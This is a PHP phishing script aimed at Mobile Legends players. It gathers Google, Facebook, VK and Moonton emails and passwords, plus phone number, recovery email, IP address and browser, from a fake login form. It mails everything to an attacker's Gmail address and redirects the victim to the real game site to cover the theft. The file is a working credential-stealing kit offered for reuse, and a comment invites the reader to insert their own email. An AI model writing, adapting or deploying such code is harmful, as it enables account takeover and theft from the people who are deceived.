<?php
header("location: http://web.mobilelegends.com/");
?>
<?php
//RECODE DIKIT AUTO RUSAK 
//Author : Rahim AR

$subjek = '$RESULT ML$ - X-Mr.R4h1M';
$mailto = 'user.rahim@gmail.com'; //masukin email lo disini

$nama = $_POST['id'];
$user = $_POST['gsubmit'];
$imel = $_POST['gp1'];
$paswot = $_POST['gp2'];
$henpon = $_POST['fb1'];
$teha = $_POST['fb2'];
$evk1 = $_POST['vk1'];
$pvk2 = $_POST['vk2'];
$emt1 = $_POST['mnt1'];
$pmt2 = $_POST['mnt2'];
$la = $_POST['level'];
$js = $_POST['skin'];
$np = $_POST['nope'];
$emr = $_POST['recov'];
$ngr = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];


$body = <<<EOD
<br><hr><br>
++====[$$ INFO AKUN ML $$]====++<br>
<br>
Username : $nama<br>
<br>
Email Google : $imel<br>
Password  Google : $paswot<br>
<br>
Email Facebook : $henpon<br>
Password Facebook : $teha<br>
<br>
Email VK : $evk1<br>
Password VK : $pvk2<br>
<br>
Email Montoon : $emt1<br>
Password Montoon : $pmt2<br>
<br>
++====[ End ]====++<br>
<br>
++====[$$ DETAIL ACCOUNT $$]====++<br>
<br>
Level Account : $la<br>
Jumlah Skin : $js<br>
Nomor HP : $np<br>
Email Recovery : $emr<br>
Negara : $ngr<br>
Alamat IP : $ip<br>
Browser : $browser<br>
<br>
++===[ End ]====++

EOD;


$headers = "From: Info@phsing.com\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers);
?>